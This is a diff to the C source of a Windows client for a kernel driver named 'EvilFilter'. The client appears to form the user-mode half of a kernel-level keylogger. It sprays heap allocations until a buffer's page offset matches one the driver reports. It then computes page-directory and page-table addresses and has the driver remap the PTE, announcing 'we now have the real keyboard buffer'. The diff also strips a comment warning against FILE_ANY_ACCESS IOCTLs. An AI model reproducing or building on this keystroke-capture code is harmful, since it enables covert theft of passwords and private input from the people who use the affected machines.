@@ -3,9 +3,7 @@
 
 #include "stdafx.h"
 #include <windows.h>
-//#include <ntddkbd.h>
 #include <SharedHeader.h>
-//#include <ntdef.h>
 
 VOID WaitAMinute() {
 	printf("Waiting a minute...");
@@ -28,28 +26,16 @@ VOID WaitAMinute() {
 }
 
 int main(int argc, _TCHAR* argv[]) {
-	//#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_BUFFERED, FILE_READ_DATA)
 	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
 	HANDLE hControlDevice;
 	ULONG  bytes;
 
-	//
-	// Open handle to the control device. Please note that even
-	// a non-admin user can open handle to the device with
-	// FILE_READ_ATTRIBUTES | SYNCHRONIZE DesiredAccess and send IOCTLs if the
-	// IOCTL is defined with FILE_ANY_ACCESS. So for better security avoid
-	// specifying FILE_ANY_ACCESS in your IOCTL defintions.
-	// If the IOCTL is defined to have FILE_READ_DATA access rights, you can
-	// open the device with GENERIC_READ and call DeviceIoControl.
-	// If the IOCTL is defined to have FILE_WRITE_DATA access rights, you can
-	// open the device with GENERIC_WRITE and call DeviceIoControl.
-	//
 	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
-		GENERIC_READ | GENERIC_WRITE, // Only read access
+		GENERIC_READ | GENERIC_WRITE, 
 		FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
 		NULL, // no SECURITY_ATTRIBUTES structure
 		OPEN_EXISTING, // No special create flags
-		FILE_FLAG_OVERLAPPED, // 0 //  No special attributes
+		0, //  No special attributes
 		NULL); // No template file
 
 	if (INVALID_HANDLE_VALUE == hControlDevice) {
@@ -60,9 +46,6 @@ int main(int argc, _TCHAR* argv[]) {
 		PKEYBOARD_INPUT_DATA keyboardData;
 		OVERLAPPED      DeviceIoOverlapped;
 		PSHARED_MEMORY_STRUCT dataToTransmit;
-		HANDLE currentProcessHandle;
-
-		currentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
 
 		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
 		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
@@ -80,79 +63,65 @@ int main(int argc, _TCHAR* argv[]) {
 			NULL, 0,
 			dataToTransmit, SharedMemoryLength,
 			&bytes, &DeviceIoOverlapped)) {
-			printf("Ioctl to EvilFilter device failed\n");
+			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
 		}
 		else {
-			printf("Ioctl to EvilFilter device succeeded\n");
-			printf("keyboardData is [0x%lx]\n", keyboardData);
+			ULONG kmdfOffset = dataToTransmit->offset;
+			ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
+			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
 
 
-		}
-		ULONG kmdfOffset = dataToTransmit->offset;
-		ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
-		printf("offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
-
-
-		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
-		keyboardOffset = (ULONG)keyboardData & 0x0fff;
-		printf("address is [0x%lx] offsets are [0x%lx] [0x%lx]\n", keyboardData, kmdfOffset, keyboardOffset);
-		ULONG count = 0;
-
-		PLLIST listNode;
-		listNode = (PLLIST)malloc(sizeof(LLIST));
-		listNode->keyboardBuffer = keyboardData;
-		listNode->previous = NULL;
-		while (keyboardOffset != kmdfOffset) {
-			count++;
-			printf("Offsets do not match...lets do it again...");
 			keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
 			keyboardOffset = (ULONG)keyboardData & 0x0fff;
-			printf("address is [0x%lx] offsets are [0x%lx] [0x%lx]\n", keyboardData, kmdfOffset, keyboardOffset);
-			PLLIST previousListNode = listNode;
+			PLLIST listNode;
 			listNode = (PLLIST)malloc(sizeof(LLIST));
 			listNode->keyboardBuffer = keyboardData;
-			listNode->previous = previousListNode;
-		}
-		printf("keyboardData is [0x%lx] - it took %lu tries to get here\n", keyboardData, count);
-
-		printf("freeing unused memory...\n");
-		while (listNode != NULL) {
-			printf("[%lu]", count--);
-			PLLIST currentListNode = listNode;
-			listNode = listNode->previous;
-			if (currentListNode->keyboardBuffer != keyboardData) {
-				free(currentListNode->keyboardBuffer);
+			listNode->previous = NULL;
+			while (keyboardOffset != kmdfOffset) {
+				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
+				keyboardOffset = (ULONG)keyboardData & 0x0fff;
+				PLLIST previousListNode = listNode;
+				listNode = (PLLIST)malloc(sizeof(LLIST));
+				listNode->keyboardBuffer = keyboardData;
+				listNode->previous = previousListNode;
 			}
-			free(currentListNode);
-		}
+			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
+			while (listNode != NULL) {
+				PLLIST currentListNode = listNode;
+				listNode = listNode->previous;
+				if (currentListNode->keyboardBuffer != keyboardData) {
+					free(currentListNode->keyboardBuffer);
+				}
+				free(currentListNode);
+			}
 
+			PVOID ppde = GetPdeAddress(keyboardData);
+			PVOID ppte = GetPteAddress(keyboardData);
+			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);
 
-		PVOID ppde = GetPdeAddress(keyboardData);
-		PVOID ppte = GetPteAddress(keyboardData);
-		printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);
+			dataToTransmit->ClientMemory = keyboardData;
+			dataToTransmit->PageDirectory = ppde;
+			dataToTransmit->PageTable = ppte;
+			dataToTransmit->instruction = 'E';
 
-		dataToTransmit->ClientMemory = keyboardData;
-		dataToTransmit->PageDirectory = ppde;
-		dataToTransmit->PageTable = ppte;
-
-		dataToTransmit->ClientMemory = keyboardData;
-		dataToTransmit->PageTable = ppte;
-		dataToTransmit->instruction = 'E';
-		WaitAMinute();
-
-		if (!DeviceIoControl(hControlDevice,
-			IOCTL_CUSTOM_CODE,
-			NULL, 0,
-			dataToTransmit, SharedMemoryLength,
-			&bytes, &DeviceIoOverlapped)) {
-			printf("Ioctl to EvilFilter device failed\n");
-		}
-		else {
-			printf("Ioctl to EvilFilter device succeeded\n");
-			//printf("keyboardData is [0x%lx]\n", keyboardData);
-
+			if (!DeviceIoControl(hControlDevice,
+				IOCTL_CUSTOM_CODE,
+				NULL, 0,
+				dataToTransmit, SharedMemoryLength,
+				&bytes, &DeviceIoOverlapped)) {
+				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
+			}
+			else {
+				printf("Ioctl to EvilFilter device succeeded - we now have the real keyboard buffer!!!\n");
+				WaitAMinute();
+				WaitAMinute();
+				WaitAMinute();
+			}
 		}
 		CloseHandle(hControlDevice);
+		WaitAMinute();
+		WaitAMinute();
+		// Everything dies right here, right as we exit
 	}
 	return 0;
 }
